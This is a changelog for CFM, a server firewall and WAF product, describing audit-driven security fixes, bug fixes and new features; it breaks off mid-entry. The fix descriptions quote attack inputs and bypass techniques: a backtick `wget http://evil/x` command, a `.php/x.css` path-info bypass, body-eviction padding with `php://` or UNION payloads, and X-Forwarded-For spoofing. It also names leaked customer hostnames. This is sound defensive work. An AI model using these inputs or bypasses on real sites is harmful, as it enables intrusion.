# Changelog

All notable changes to CFM are recorded here.

**Versioning is date-based: the version *is* the release date** (`YYYY.MM.DD`,
from `date +%Y.%m.%d` in the Makefile). Each released `.deb`/`.rpm` produced by
`make release` carries that day's date, so every dated heading below
corresponds to a real package that was built and `make sync`'d out.

Format loosely follows [Keep a Changelog](https://keepachangelog.com/):
group entries under **Added / Changed / Fixed / Security / Removed**. Work in
progress accumulates under **[Unreleased]**; on release day it moves under a
new `## YYYY.MM.DD` heading (see CLAUDE.md → "Releasing & CHANGELOG").

History before this file (the first ~1000 PRs, Mar–Jun 2026) is not
back-filled here — see the git/PR history for that period.

## [Unreleased]

### Security
- **Challenge/WAF bypass-list generator hardened against overbroad / poisoned
  feed prefixes.** `configs/challenge_waf_bypass.conf` is a geo include whose
  every prefix makes `cfm.lua` early-return straight to origin, disabling WAF
  **and** challenge for that IP space. Its generator (`scripts/build_bypass_list.py`,
  a manually-run Python script — there is no "Go generator" despite the audit
  note) previously validated only CIDR *syntax*: an over-broad or poisoned feed
  prefix (`0.0.0.0/0`, a `/8`, a whole hosting ASN) would have been emitted
  verbatim and silently turned protection off for a huge range, and a
  feed-controlled JSON `creationTime` written into a comment could inject a
  standalone geo directive via an embedded newline. The generator now: rejects
  non-public ranges (`0.0.0.0/0`/`::/0`, RFC1918/loopback/link-local/multicast/
  reserved) and anything broader than the shipped floors (IPv4 `/16`, IPv6 `/32`
  — no current prefix dropped), with per-source and total count caps that abort
  the run; sanitises all metadata (strips CR/LF/control) before writing; writes
  atomically (temp + fsync + rename); and refuses to replace the list with a
  suspiciously small one (< floor or a >50% shrink), keeping the last-good file.
  A new offline CI guardrail `scripts/tests/check_bypass_list.sh` (+
  `bypass_list_test.py`) unit-tests these bounds and re-validates the committed
  `challenge_waf_bypass.conf` with the generator's own `normalize_prefix` (no
  network, no rule drift), wired into `security.yml` and `/preflight`. The unused
  duplicate `scripts/challenge_waf_bypass.conf` was removed and the generator's
  default output now resolves to the authoritative `configs/` copy. Found by the
  2026-07 edge audit coverage-gap review.
- **GhostLock (CVE-2026-43499) posture — design note.** Added
  `docs/ghostlock-tenant-seccomp-design.md`: a design-only guide for the one
  runtime control that could *prevent* (not just degrade/detect) the public
  local-root exploit — a **per-tenant seccomp filter** denying the futex-PI
  operations (`FUTEX_LOCK_PI`/`TRYLOCK_PI`/`WAIT_REQUEUE_PI`/`CMP_REQUEUE_PI`)
  to the web-tier uid range (`cfm_watched_uids`). Documents why it cannot be a
  BPF-LSM rule (no LSM hook on `futex()`), why it is scoped to **bare metal /
  empty VM / custom installs** and explicitly *not* cPanel/DirectAdmin/CloudLinux
  (CageFS/LVE owns tenant confinement there), and how it layers on the shipping
  levers `kernsec randomize_kstack_offset=on` and `cfm-lsm CFML-FS-008`. No code
  change — guide only.
- **Scoped-vs-admin boundary — edge `lua-stats` (F01):** the `/cfm-admin/lua-stats`
  dashboard endpoint (rendered inside OpenResty/Angie) gated access with an
  `auth_request` pointed at `/api/v1/tokens/me` — a **scoped-OR-admin** endpoint
  that returns 200 for *any* valid token. A scoped cPanel **viewer** token
  therefore passed the gate and received the **fleet-wide** stats blob: every
  tenant's WAF exclude host/path lists and per-rule modes (logonly vs block),
  plus cert and decision-cache counters — enough to craft WAF bypasses against
  the whole box. Added an admin-only auth probe `/api/v1/admin/authcheck`
  (`RequireAdmin`; 403 for scoped/anonymous) and repointed the `auth_request`
  gate to it in **both** `openresty.conf` and `angie.conf` (two server blocks
  each). The admin WebUI dashboard — the only legitimate consumer — is
  unaffected. Found by the 2026-07 edge Lua audit.
- **WAF hit-rates cross-tenant leak (F02):** `GET /api/v1/waf/hit-rates` was
  gated scoped-OR-admin but read the `?host=` query verbatim with no scope check,
  so a scoped cPanel user could read **any** vhost's per-rule WAF hit rates — and
  an empty host aggregated **every** tenant — revealing which rules are logonly
  vs block and where they fire. `handleWAFHitRates` now enforces the token scope,
  keyed on **role** (not on the presence of a scope map — so a vhost-less scoped
  token can never be misread as admin): a non-admin caller must target a single
  host inside a **non-empty** allowlist; an empty host, an empty scope, or an
  out-of-scope host is `403`. The host is normalized (lowercased) once so the
  scope check and the case-sensitive history read agree. Admin/loopback (the CLI)
  is unchanged. Mirrors the role-keyed `scopedMySQLFilterHandler` / `vhostAllowed`
  guards; added to `docs/endpoint_scope_inventory.md`. Found by the 2026-07 edge
  Lua audit.
- **WAF (rule 317, `WAF_CMD_PAYLOAD:PAY_BACKTICK`, challenge): fixed a dead
  backtick-RCE matcher that let most backtick command substitutions through.**
  The command allowlist was written `inner:match("^%s*(wget|curl|…)%f[^%a]")`,
  but **Lua patterns have no `(a|b|c)` alternation** — that group matched the
  literal string `wget|curl|…`, so it never fired. Only the adjacent
  `;`/`|`/`&&`-inside-backticks branch worked, so `` `wget http://evil/x` ``,
  `` `id` ``, `` `whoami` `` (no shell metachar) passed unchallenged. The leading
  token inside the backticks is now captured (`^%s*(%a+)`) and tested against a
  command set, so a full word must match exactly (`` `category` `` ≠ `cat`). It
  scans query args only, the search-field carve-out (q/s/term/search/query) is
  preserved, and the tier stays **challenge** (no block/ban). Covered by
  `scripts/tests/cfm_waf_backtick_smuggling_test.lua`. Found by the 2026-07 edge
  Lua audit (F05).
- **WAF / challenge excludes: the in-path (Lua) glob matcher now scopes `*`/`?`
  to a single path segment, matching the Go enforcement matcher.** The Lua
  `glob_to_lua_pattern` (`cfm_waf_excl.lua`) expanded `*`→`.*` and `?`→`.`, both
  of which cross a `/`, while the Go log-driven matcher (`globToRegex` in
  `exclude_store.go`) uses `[^/]*`/`[^/]`. So an operator exclude like
  `/wp-admin/*` switched the WAF (or challenge) **off in-path** for the entire
  `/wp-admin/a/b/c…` subtree, while the log-driven side only excluded direct
  children — a silent, one-sided widening of the WAF-off region onto unintended
  deep paths. Lua now emits `[^/]*`/`[^/]` too, so both engines agree. Hosts are
  unaffected (no `/`). To exclude a whole subtree, use a **non-glob path prefix**
  (`/wp-admin`), which already matches the subtree at a segment boundary.
  Behaviour change: an exclude relying on `*` to cross `/` in-path now stops at
  one segment (as it always did on the log-driven side). `[...]` bracket-class
  globs are still matched literally in Lua (Go treats them as a class) — a
  rarer, narrower-in-Lua consistency gap tracked as a follow-up. Covered by
  `scripts/tests/cfm_waf_excl_test.lua`. Found by the 2026-07 edge Lua audit (F10).
- **WAF (body-aware rules): a padded query string could evict the POST body from
  inspection (F09).** The shared normalized scan surface `get_norm_ab` built
  `cap(args .. "&" .. body, budget)` — with the attacker-controlled query string
  **first** and a single cap over the merge — so a query padded to the
  Content-Type body budget consumed the whole allowance and truncated the body
  away. Every body-aware detector that reads this surface (SQLi, `php_wrappers`,
  `ssrf`, `js_proto`, `log4shell`, `superglobal`, `c2_tunnel`) then missed a
  body-borne payload: e.g. `POST /?<8 KB of padding>` with a urlencoded body
  carrying `php://…` or a `UNION SELECT` was not inspected. `get_norm_ab` now
  caps args and body **independently** (each to the body budget) before the
  concat, so the body always gets its full allowance; the transient stays
  bounded to ~2×budget. The same independent-cap was applied to
  `detect_crlf_injection` (rule 605, which builds its own args+body scan
  surface) and to the detector-internal fallback scan strings, so no divergent
  copy of the pattern remains. Covered by
  `scripts/tests/cfm_waf_body_budget_test.lua` (Test 9 — urlencoded/JSON budgets,
  `php_wrappers`/SQLi/CRLF paths, verified to fail on the old single-cap form).
  Found by the 2026-07 edge Lua audit (F09).
- **WAF/challenge bypass via PHP path-info on the static-asset fast path (F06).**
  The edge static-asset `location ~*` regex matched the URL *suffix*
  (`\.(css|js|woff|…|map)$`), not the file Apache actually serves, and runs
  `access_by_lua_block { return; }` — skipping `cfm.lua` (WAF **and** challenge)
  entirely. So `GET /uploads/evil.php/x.css` matched the `.css` bypass yet, under
  `cgi.fix_pathinfo`, executed `evil.php` at the origin with the edge inspection
  disabled. All four bypass locations (OpenResty + Angie, HTTP + HTTPS) now anchor
  the regex with a PHP-scoped negative-lookahead —
  `^(?!.*\.(?:phtml|pht|php[0-9]|php|phar)/).*\.(?:css|js|…|map)$` — so any URL
  with a `.php…/` (or `.phtml/`/`.pht/`/`.php5/`/`.phar/`) segment falls through to
  `cfm.lua` and is inspected again. This closes the universal `cgi.fix_pathinfo`
  `.php/` vector (which executes regardless of Apache handler style). Genuine
  static is unaffected, including `?v=` cache-busters (nginx matches the location
  against `$uri`, which excludes the query) and legitimately-named `foo.php.css`.
  Scoped to the PHP suffix family by design: multi-extension names
  (`/evil.php.jpg/…`, executable only under the legacy `AddHandler` form, not
  modern EA4 `<FilesMatch \.php$>`) and non-PHP handlers (`.cgi`/`.pl`/`.py`/
  `.shtml`) stay on the fast path — narrower residuals still covered by the
  log-driven behavioural engine. Verified by PCRE case matrix, `nginx -t`, live
  nginx routing (incl. `%2f` encoded-slash, which nginx decodes into `$uri`
  before location matching, so it is not evadable), and an adversarial review.
  Found by the 2026-07 edge Lua audit (F06).
- **Account-transfer tunnel: source-IP spoofing via client-supplied
  X-Forwarded-For (F03).** The raw TCP tunnel that carries WHM live-transfer
  rsync/dsync streams (`/acctxferrsync`, `/acctxferdsync`) replayed the client's
  headers to loopback cpsrvd and only injected `X-Forwarded-For`/`X-Real-IP`/
  `CF-Connecting-IP` **if the client hadn't already sent one** — so a
  client-supplied value passed through verbatim. cpsrvd's Apache trusts
  X-Forwarded-For from loopback (mod_remoteip), and the tunnel runs with the
  challenge/WAF bypassed on an internet-facing panel port, so an attacker could
  forge their apparent source IP into cpsrvd's audit log, cPhulk brute-force
  tracking, and IP allow/deny logic (e.g. impersonate a cPhulk-allowlisted IP,
  or frame an arbitrary one). Every other panel path already overwrites these
  with `$remote_addr`; this tunnel was the gap. It now takes sole authority over
  the forwarding/real-IP header set: it strips **every** client-supplied
  `X-Real-IP`/`X-Forwarded-For`/`X-Forwarded-Host`/`X-Forwarded-Port`/
  `X-Forwarded-Proto`/`X-Forwarded-Server`/`CF-Connecting-IP` (case-insensitively)
  and re-injects trusted values from `$remote_addr`, exactly mirroring the
  sibling `proxy_set_header … $remote_addr` blocks. Obsolete line folding
  (RFC 7230 §3.2.4) is dropped wholesale so a spoofed header can't ride in as a
  fold of a benign one. This is a no-op for legitimate transfers
  (`whm_xfer_download-ssl` never sends these headers, nor folds any); only a
  forged header/fold is dropped. Covered by
  `scripts/tests/cfm_panel_tunnel_xff_test.lua` (runs the real tunnel over
  stubbed cosockets and asserts on the exact upstream header block; verified to
  fail against the pre-fix file). Found by the 2026-07 edge Lua audit (F03).

### Fixed
- **DNAT/panel scoped accepts were appended AFTER the default drop (and
  duplicated) — DNAT'd web/panel traffic was dropped unless the listener ports
  were in `TCP_IN`.** `ensureScopedDNATAccepts` / `EnsurePanelDNATAccepts` (nft
  backend) listed the input chain with `nftOut("-a list chain inet cfm input")`,
  but `nftOut` feeds its argument to `nft -f -` (script mode) where the `-a`
  handle flag is a **syntax error**. The listing therefore failed and the error
  was discarded, so: (1) the default-drop handle was never found and the scoped
  `ct status dnat` accepts were **appended after** the drop (never matched), and
  (2) the "does this accept already exist" cleanup matched nothing and **piled
  up duplicate** accept rules on every reload. Net effect on cPanel/Imunify boxes
  with `cfm dnat on` / `cfm dnat cpanel on`: only allowlisted (`allow_dyn`) IPs
  could reach the site; everyone else was dropped — masked only by listing
  `9080/9043/12082..` in `TCP_IN`. Fixed by listing via `ListChainText` (argv
  mode) in all five affected call sites (`ensureScopedDNATAccepts`,
  `cleanupScopedDNATAccepts`, `EnsurePanelDNATAccepts`, `RemovePanelDNATAccepts`,
  `PanelDNATAcceptState`) and failing closed on a list error instead of silently
  appending. You no longer need the DNAT listener ports in `TCP_IN`. Regression
  tests: `TestDNATOnPlacesAcceptsBeforeDefaultDrop` (live-nft, gated by
  `CFM_NFT_INTEGRATION=1`) and `TestNftOutIsNeverCalledWithCLIFlags` (source
  guard). Review hardening on the same change: `nftOut` now rejects a
  leading-dash arg at runtime (the flag-in-script-mode footgun that caused the
  bug); the default-drop matcher and the redirect-port parser were consolidated
  into `internal/firewall/dnat_accepts.go` (single source of truth for the nft
  backend and the dnat CLI, previously copy-pasted in 3-4 spots); `cfm dnat`
  status now resolves accepts against the ports actually installed in
  `cfm_redirect` (not the CLI/env default) so a custom-port box no longer shows
  false `ABSENT`; and `PanelDNATAcceptState` became placement-aware (an accept
  stranded after the drop reports `blocked`, not `open`).
- **Socket-ingest-only boxes: forced-vhost challenge (and all webdetector
  challenge/block emission) never ran.** When the webdetector ingests via the
  Unix socket (`/run/cfm/ingest.sock`, fed by the OpenResty/Angie edge) and the
  configured `LOG_PATH` file does not exist, `webdetector_register` never
  attaches a file source, so `Engine.src` is nil. `RunOnce` returned at its
  `if e.src == nil { return nil }` guard **before** the periodic reconcile —
  and that reconcile (`emitIPChallenges` / `emitIPBlocks`) is the *only* place
  the `CHALLENGE_VHOST` list, per-IP challenges, and autoblocks are pushed to
  the edge. Net effect on a socket-only server: the forced list loaded fine but
  `/nginx/status` showed `active_vhosts: []` and `cpanel.*`/`webmail.*`/`whm.*`
  were never challenged, even though scoring/history (socket-fed) and the
  in-path WAF (independent) both worked — so it looked like a config mistake.
  `RunOnce` now drains the file source only when one is attached and **always**
  runs the reconcile, so the socket is a first-class standalone source (as it
  already is for `cfm webtop` and the WAF). A transient `Open()` failure (e.g. a
  log mid-rotation) likewise no longer skips the reconcile — but the tail
  resume-offset is now persisted **only after a clean drain** (`srcDrained`
  guard), so an Open/read failure can't overwrite the saved offset with a
  zeroed `Position()` and make recovery seek-to-end and skip lines. Regression
  tests: `TestRunOnce_SocketOnlyStillPushesForcedVhosts`,
  `TestRunOnce_OpenFailureDoesNotClobberSavedOffset`. Workaround on older
  builds: `touch` the `LOG_PATH` file so a source attaches.

### Changed
- **`cfm dnat` now reports the scoped listener-port accepts (web scope).**
  `cfm dnat on` DNATs `80→:9080` / `443→:9043` and installs scoped
  `ct status dnat` accepts in `inet cfm/input` so the redirected traffic reaches
  the edge **without** `9080/9043` in `TCP_IN` — but the web path did this
  silently, so an operator whose site was unreachable after `cfm dnat on` had no
  way to tell a missing CFM accept from an upstream drop. `cfm dnat on` now
  prints a `Firewall: opened scoped 80->9080 tcp (nft cfm/input)` line per mapping
  (parity with `cfm dnat cpanel on`) and warns loudly when a mapping is absent or
  landed after the default drop; `cfm dnat` status gains a **Scoped DNAT
  accepts** block reporting each mapping as `open` / `BLOCKED` / `ABSENT`. When
  all read `open` but a non-allowlisted client still can't connect, the drop is
  upstream (external CSF/Imunify `INPUT` filtering the listener port, or an edge
  bound to `127.0.0.1` only) — see `docs/dnat-bypass.md`. No change to the
  firewall rules themselves.
- **Reference `detectors.conf` ships a sane cPanel forced-challenge default and
  drops leaked customer hosts.** `CHALLENGE_VHOST` now defaults to
  `webmail.*, whm.*, cpanel.*` (force-challenge the cPanel/WHM/webmail service
  subdomains — high-value on cPanel boxes, inert elsewhere) instead of the
  `victim.com` placeholder. `CHALLENGE_VHOST_IGNORE` / `CHALLENGE_HOST_BYPASS`
  are now **empty** — the shipped reference previously carried real
  customer/operator hostnames (`api.mybank.gr`, `stereotiki.gr`, `ndnodo.com`,
  `*.e-nautilia.gr`, …), which would apply one operator's exclusions/bypasses on
  every install. These are operator-specific and must be set per host.

### Added
- **`cfm health` edge section: TSV access-log and origin real-IP visibility.**
  Two new read-only lines under "Web stack - Edge Interceptor", to make a fresh
  edge setup self-diagnosing:
  - **TSV access log** — reads `[webdetector] LOG_PATH`, then reports whether the
    file exists and is *filling* (write-recency + size shown as context only —
    the file's mtime is the producer's signal, not the ingest consumer's health,
    so a quiet vhost that writes nothing is never flagged). It warns only on
    unambiguous faults: the path is not a regular file, or it is absent while the
    ingest socket is also not live (no ingest source wired at all). Never
    false-alarms on socket-only or idle boxes.
  - **Origin real-IP** — detects the origin stack (Apache / LiteSpeed / nginx,
    cPanel + DirectAdmin/plain paths) and checks that 127.0.0.1 is trusted as a
    real-IP proxy (`RemoteIP{Internal,Trusted}Proxy` for Apache, LiteSpeed's
    native `useIpInProxyHeader`, `set_real_ip_from` for nginx). Warns — with the
    concrete consequence ("access logs will record 127.0.0.1, not client IPs")
    — when the trust directive is missing. Purely diagnostic; changes nothing.
    The stack is resolved from on-disk install markers, not blindly from the
    collector's upstream hint, so an OpenResty box (the edge is nginx-based) is
    no longer misreported as an "nginx" origin when the real origin is LiteSpeed
    or Apache. The collector now also recognizes the current `litespeed` process
    name (not just the older `lshttpd`).
- **`cfm.api.conf` overlay now carries MaxMind credentials too, plus a shipped
  `cfm.api.conf.example`.** The per-server secrets overlay
  (`LoadConfigWithAPIOverride`) already overrode the cfm-web API `API_URL` /
  `AUTH_TOKEN`; it now also overlays `MAXMIND_ACCOUNT_ID` / `MAXMIND_LICENSE_KEY`
  (only when the overlay sets them), so the base `cfm.conf` can ship secret-free
  and identical on every host while a single `/etc/cfm/cfm.api.conf` holds the
  API + MaxMind secrets. Ships `configs/cfm.api.conf.example` (all values empty,
  so an un-edited file is inert — no reporting redirected to a real endpoint,
  GeoIP falls back to IPLocate); the deb/rpm post-install seeds
  `/etc/cfm/cfm.api.conf` (0600) from it on first install only (never overwrites
  an existing file; it is not a tracked conffile). The overlay is read at daemon
  **startup**, so edits need a `systemctl restart cfm` (documented in the file
  header), not just a reload.
  Runtime tokens (`CHALLENGE_TOKEN` / `OPENRESTY_TOKEN` / `SSLCOLLECTOR_SOCK_TOKEN`)
  still auto-generate on first boot, so they never need to be in the overlay.
  Covered by `TestLoadConfigWithAPIOverride_MaxMindAndAPI` /
  `…_APIOnlyOverlayKeepsBaseMaxMind`.
- **Startup log line for the forced-challenge vhost list (`CHALLENGE_VHOST`).**
  The webdetector now echoes the panic/bypass lists at config-load time —
  `forced-challenge vhosts (CHALLENGE_VHOST) loaded: count=N list=…`, plus
  companion lines for `CHALLENGE_VHOST_IGNORE` and `CHALLENGE_HOST_BYPASS` when
  set — mirroring the existing `challenge exclude loaded` line. Previously the
  forced list produced **no** startup output: the per-host bridge push is lazy
  (a `[nginx_bridge] vhost_challenge host=… reason=vhost_config` line appears
  only once a host matching the pattern actually receives traffic), so on a
  freshly-restarted, idle server `grep vhost /var/log/cfm/*` came back empty and
  read as a misconfiguration even though the list was loaded and active.
- **cfm-lsm event enrichment, Tier B (BPF wire fields).** The LSM event now
  carries the caller's parent tgid (`ppid`) read in-kernel at the instant it
  fired, plus — for `CFML-OBS-004` — the ptrace target's pid and euid
  (`aux_pid`/`aux_uid`). Two operator-visible wins: (1) the parent launcher
  (cron/script/controller) is resolved from the event `ppid` even when the
  short-lived caller has already exited by drain time (previously `proc=gone`
  meant no parent, since userspace can't read a dead process's `/proc`); (2)
  OBS-004 alerts show `target_pid=`/`target_uid=` alongside the target comm, so
  an operator can tell exactly which process was introspected and whether a
  cross-uid target was root or another tenant. The event struct grew from 112 to
  124 bytes (fields appended after `filename`); `common.bpf.h`, `events.go`, and
  the regenerated `.o` objects move in lockstep, and the Go parser accepts the
  112-byte base as a floor so it stays correct against an older pinned build
  during the version-marker refresh window.
- **cfm-lsm event enrichment — actionable alerts + a self-preserving forensic
  trail.** Every LSM detection now carries a best-effort `/proc` snapshot of the
  offending process, gathered in the drain path within milliseconds of the event
  (before a short-lived caller exits), folded into the `cfm.log` line and the
  notify email: `user` (uid→name), the **real** `exe` path (+ `(deleted)` flag —
  `comm` is spoofable, the exe inode is not), **SHA-256** of the exe (VirusTotal-
  ready, works on unlinked binaries), `cwd`, `cmdline`, `ppid`+parent `comm`/`exe`,
  and `loginuid`. Two further layers: **`enrich_peers`** appends the *uid swarm
  roster* — every process sharing the caller's real uid with its pid/comm/real-exe,
  so a compromised account's whole set of spoofed-comm processes (all typically
  pointing at one dropped binary) is captured while those pids still exist; and
  **`enrich_capture`** copies suspicious binaries (already-deleted, or under
  `/tmp`,`/var/tmp`,`/dev/shm`,`/run`,`/home`) out of `/proc/<pid>/exe` into
  `capture_dir` (default `/var/lib/cfm/lsm/capture`, `<sha256>.bin`, root-only,
  never executed, deduplicated, bounded) so a self-deleting dropper is preserved
  for analysis. All four knobs live under `[events]` in `lsm.conf` and **default
  ON** (a pre-existing conf inherits them on upgrade — no edit needed). Snapshots
  are cached per caller pid and rosters per uid, so a burst does the `/proc` work
  (incl. hashing and the full scan) once.
- **cfm-lsm alert-flood fix (fold into the above).** For the ptrace sweep policy
  `CFML-OBS-004` — which fires once per (caller, target) pair as a `pgrep`-style
  tool walks `/proc` — the notify email *reason* is now caller-identity-stable
  (uid + comm + exe, no pid, no per-target `ptrace`/`sameuid` tag), so the existing
  notify deduper collapses a whole sweep into a **single email** instead of one
  per target (previously the target + pid were in the dedup key, so a sweep
  produced up to the per-policy cap in emails). The collapse is scoped to that
  sweep policy: discrete-action policies (`FS-005`, `CRED-002`, `EXEC-*`) keep one
  email per target and keep the target/pid in the notify JSONL audit. The
  per-target detail, swarm roster, and captured-binary references ride in the
  email's **Sample lines** and the `Extra` map; `cfm.log` keeps the full
  per-event line. Enrichment is also gated behind the per-policy rate cap (a
  rate-dropped event does no `/proc` work) and all emitted fields are sanitised
  against log/email injection.
- **Web detector observability:** per-IP / subnet challenge **issuance** is now
  logged to `cfm.challenges.log` as `[challenge_issued] ip=… host=… rule=… ttl=…`
  (gated by `ChallengeLog`, like every other `[challenge]*` line). Previously an
  *issued-but-unsolved* challenge left no greppable trace — that log only records
  **solves** (keyed by the solver), and vhost-wide trips log under `host=`, not
  the client IP — so `grep <ip> cfm.challenges.log` for a challenged-but-non-JS
  client (API integrations, prefetch proxies, scanners) came back empty and the
  reason lived only in the webdetector history. De-duplicated to one line per
  `(ip, rule)` window (refreshes while a challenge stays active don't re-log), so
  it's greppable without being noisy.

### Fixed
- **Packaging (.deb): six `/etc/cfm` config files were not registered as
  `conffiles`, so `dpkg` silently overwrote operator edits on every upgrade.**
  The `.deb` ships 16 files under `/etc/cfm`, but `debian/DEBIAN/conffiles`
  listed only 10 — a file under `/etc` that dpkg installs but that is *not* a
  conffile is treated as a regular file and **replaced unconditionally on
  upgrade** (no prompt, no `.dpkg-dist` backup). The six unprotected files were
  `webdetector_challenge_exclude.txt`, `webdetector_challenge_paths.txt`,
  `webdetector_malpaths.txt`, `cfm.ignore`, `cfm.dnat_bypass` and
  `cfm.dnat_cpanel_bypass` — all operator-tuned lists, so a Debian/Ubuntu
  upgrade wiped local customisations (e.g. a hand-edited challenge-exclude or
  DNAT-bypass list). The RPM already protects all 16 with `%config(noreplace)`;
  the six are now added to `conffiles` so the `.deb` matches — dpkg keeps the
  operator's version and parks the new default as `.dpkg-dist`. RPM users were
  never affected. (Verified: `conffiles` == the deb-staged `/etc/cfm` set ==
  the RPM `%config` set — 16 each.)
- **Edge → bridge RPC (`cfm.lua`):** removed a ~300 ms stall on every edge→daemon
  call that returns an empty body (`Content-Length: 0`) — the WAF autoblock
  **push** and the block/clear calls (`/nginx/ip`, `/nginx/vhost`). (`observe`
  and `ok-touch` return a small JSON body, so they were never affected.)
  `http_unix` read the response body with a fall-through `receive("*a")`, which
  on the keep-alive
  bridge socket blocks until the read timeout (`CFM_DECISION_TIMEOUT_MS`, default
  300 ms) because the daemon never closes the connection; an explicit
  `Content-Length: 0` is now short-circuited to an empty body. Under a
  WAF-tripping flood each distinct `(ip, reason)` push tied up an nginx worker
  light-thread for ~300 ms of blocked time — the source of the intermittent "lua
  tcp socket read timed out" seen under only modest load. No behaviour change for
  non-empty responses (decision JSON, chunked). Found by the 2026-07 edge Lua
  audit (F04).
- **WAF (rule 606, `WAF_HTTP_SMUGGLING`, logonly): the request-line-smuggling
  detector never fired.** It was doubly dead: the verb match used
  `sl:match("(get|post|…)…")` (Lua has no `|` alternation, so it matched the
  literal string), AND the pre-filter tested the raw string for lowercase
  `" http/"` while a smuggled request line is normally uppercase
  `"GET … HTTP/1.1"`. The string is now lowercased first, then each known method
  is tested at a word boundary (`%f[%a]verb%s+[^%s]+%s+http/%d`). Stays
  **logonly** (observe-only). Covered by
  `scripts/tests/cfm_waf_backtick_smuggling_test.lua`. Found by the 2026-07 edge
  Lua audit (F12).
- **Web detector:** machine-to-machine API endpoints are no longer caught by a
  *vhost-wide* challenge. When a vhost trips the auto-suspicious-vhost score
  (`CHALLENGE_SUSPICIOUS_VHOST_SCORE` / `CHALLENGE_VHOST`), **every** request to
  the host was challenged regardless of path — silently breaking non-browser
  integrations that cannot solve the JS challenge (e.g. the v-track WooCommerce
  order sync: `/wp-json/wc/v3/orders/` got the HTML challenge instead of JSON
  during each ~35-min auto-on window, so orders stopped syncing intermittently).
  The `/nginx/decision` handler now exempts a **narrow, high-confidence** set
  from the vhost-wide challenge — WooCommerce REST (`/wp-json/wc*`, `/wc-api/`),
  payment-gateway webhooks/IPN, and the `/ws_vtrack/` plugin path. Deliberately
  much tighter than the score-exemption list (`isMachineStyleEndpointGo`), and
  applied **only** when the IP itself is not individually challenged/blocked —
  per-IP autoblock and the WAF rule engine still inspect these paths, so an
  attacker on them is still caught. Matching is substring (tolerates WP/Woo
  installed under a path prefix and the `//` form the edge forwards) with a
  path-traversal guard (`..` / `%2e` fail closed), so a token can't be decorated
  to slip a request that resolves to a different origin target past the challenge. (The reason was only visible via the
  `[challenge][vhost] action=auto_on host=…` line — keyed by host, not client
  IP — which is why a `grep <ip>` of the CFM logs came back empty.)

### Added
- Reference **challenge-exclude** ships a *VPN by Google / Chrome prefetch-proxy*
  entry (`configs/webdetector_challenge_exclude.txt`, section 9). Shared-egress
  `/24`s under `*.googlezip.net` (AS15169) were tripping the behavioural
  `CHALLENGE_SUBNET` heuristic — many real users behind one `/24` read as a
  scanner — and the non-JS prefetch proxy can never solve the interactive
  challenge, so it looped invisibly: an *issued-but-unsolved* challenge writes
  no `cfm.challenges.log` line (that log only records solves), and the reason
  lived only in the webdetector history as `challenge_issued reason=CHALLENGE_SUBNET`.
  Ships as two belt-and-suspenders rules (PTR+FCrDNS gold-standard, plus an
  ASN+PTR robust fallback). **Challenge-suppression only** — the WAF rule engine
  (SQLi/RCE/upload/webshell → 403) stays fully armed for these IPs.
- WAF rule **319 `rule_sqli_union_variant`** (`WAF_SQLI_UNION_VARIANT`) at
  **`logonly`** — observe-only detection of obfuscated UNION injection that
  rule 301's *adjacent* `union select` match misses: `union all select`,
  `union distinct select`, `union(select`, and comment-collapsed forms
  `union/**/select` → `unionselect` and `union/**/all|distinct/**/select` →
  `unionallselect`/`uniondistinctselect`. Runs on the same comment-stripped,
  `+`/whitespace-collapsed scan string as 301 and carries the identical
  value-terminator guard (the `union` must follow a value break `[%d'"%)]` or
  a `null`/`true`/`false` operand), so legit prose like *"credit union all
  selected"* / *"european union distinct selection"* does not fire. Shipped
  `logonly` for a multi-day real-traffic burn-in before any promotion; the
  `waf_security` autoblock family stays un-armed (default `0`) while logonly.
  Go registry (`waf_rule_ids.go`) and Lua (`cfm_waf.lua`) mirror the new rule;
  covered by `TestWAFSecurityFamilyCoverage` and
  `scripts/tests/cfm_waf_sqli_test.lua` (7 TP obfuscated-UNION + FP prose
  negatives). Found by the 2026-07 edge Lua audit.

### Security
- WAF / challenge excludes: **a non-glob host or path exclude no longer matches
  by plain substring**, which silently disabled protection on unintended
  vhosts/paths. Both the log-driven Go matcher
  (`internal/webdetector/exclude_store.go` `compiledValueMatcher`, which used
  `strings.Contains`) and the in-path Lua matcher (`cfm_waf_excl.lua`
  `matches_rule`, which used `value:find`) meant a `shop.gr` **host** exclude
  also switched the WAF/challenge off for `myshop.gr`, `shop.gr.evil.com`,
  `evil-shop.gr`, and a `/api` **path** exclude covered `/therapy`. Non-glob
  values now match at a boundary, identically in Go and Lua: a host matches
  **exactly or as a dot-boundary subdomain** (`shop.gr` → `shop.gr`,
  `www.shop.gr`; NOT `myshop.gr` / `shop.gr.evil.com`) and a path **exactly or
  as a path-segment prefix** (`/admin` → `/admin`, `/admin/x`; NOT
  `/administrator`). Globs (`*`/`?`) are unchanged. The host semantics now agree
  with `matchHostExclude` (the reporting-side matcher the enforcement path had
  silently diverged from). **Behaviour change for existing excludes**: a
  substring-reliant entry (e.g. `shop` to cover `shop.gr`+`myshop.gr`, or
  `/admin` to cover `/administrator`) must be re-expressed as a glob (`*shop*`,
  `/admin*`) or listed explicitly. The Lua matcher moved to `cfm_waf_excl.lua`
  for unit-testability; Go and Lua are cross-checked to agree. Found by the
  2026-07 edge Lua audit.

### Fixed
- WAF (rule 604, `WAF_CT_ANOMALY:CT_CHARSET_BYPASS`, challenge): **stopped
  challenging legitimate non-Latin form/API POSTs.** The Content-Type charset
  allowlist — which exists to flag a charset the WAF can't decode but the
  backend can (EBCDIC/IBM037, UTF-7, UTF-16), a real evasion vector — held only
  Latin + Chinese, so a Greek (`iso-8859-7`, `windows-1253`) or any other
  national-charset POST was challenged (rule 604). The allowlist now admits any
  **ASCII-superset** charset — the only property that matters here, since the
  exploit metacharacters `< > ' " ( ) ;` live in 0x00–0x7F and map to ASCII
  unchanged, so the WAF and the backend see identical bytes: every `iso-8859-*`
  and `windows-125x` national charset (Greek, Cyrillic, Hebrew, Arabic, Turkish,
  Baltic, Vietnamese), KOI8, TIS-620, and the ASCII-compatible CJK multibyte
  encodings (shift_jis/big5/euc-*). EBCDIC, UTF-7 and UTF-16/32 stay flagged, as
  do unknown charsets (fail-safe allowlist) — verified old-vs-current. The
  charset value is now also read from a **quoted** form (`charset="ibm037"`), so
  a dangerous charset can no longer dodge the check by quoting, and the capture
  accepts `_` so `shift_jis`/`ks_c_5601-1987` are recognised. Found by the
  2026-07 edge Lua audit.

### Security
- WAF (rule 401, `WAF_UPLOAD_FNAME`, block + autoblock): **closed four upload
  webshell bypasses in Content-Disposition filename extraction.** (1) The
  filename was extracted with a case-SENSITIVE `[Ff]ilename` token, but the
  parameter name is case-insensitive (PHP's rfc1867 parser uses `strcasecmp`) —
